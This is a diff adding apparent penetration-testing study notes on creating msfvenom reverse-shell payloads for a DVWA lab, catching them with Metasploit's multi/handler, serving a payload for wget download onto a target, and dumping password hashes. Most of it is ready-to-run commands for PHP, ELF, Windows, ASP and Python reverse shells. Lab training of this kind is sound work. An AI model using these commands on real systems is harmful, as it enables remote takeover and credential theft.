@@ -281,4 +281,31 @@ payloads/**
 - We will generate a PHP shell using MSFvenom to exploit the file upload vulnerablity in DVWA(Damn Vulnerable Web Application) - <mark>msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php</mark>.
 - we need the local machine IP address, and the local port to which the payload will connect to generate the reverse shell payload.
 - Note: The output PHP file will miss the starting PHP tag commented and the end tag (?>).
-- Then  we start the metasploit handler - 
+- The reverse_shell.php files should be edited to convert it into a working PHP file.
+- Comments must be removed from the beginning of the file (/*<?php /**/ ➡️ <?php) and the end tag should be added in the end (?>).
+- Then we start the metasploit Multi Handler module to receive the incoming connection using <mark>use exploit/multi/handler</mark> command.
+- We need to set the payload value to php/reverse_php, the LHOST to 10.0.2.19, and LPORT to 7777 values using <mark>show options</mark> and <mark>set</mark> command beforing running the module.
+- Then run the hundler using <mark>run</mark> command and wait for the incoming connection.
+- We have to run the reverse shell file in the target system by giving giving the permission using <mark>(+x [file name])</mark> command so that handler can get the connection.
+- These are other payloads:-
+  * Linux Executable and Linkable Format (elf)
+<mark> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf</mark>.
+  * Windows
+<mark>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe</mark>.
+  * PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+
+  * ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+
+  * Python
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+ 
+  * All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.
+
+Other useful commands:-
+ * <mark>python3 -m http.server 9000</mark> - to start server on the local machine.
+ * <mark>wget http://attacking-machine-ip:9000/shell.elf(file name)</mark> - command to download the file in the target machine.
+ * <mark>use the post/linux/gather/hashdump module</mark> - to dump the hashes of other users of target in our system.
+
+
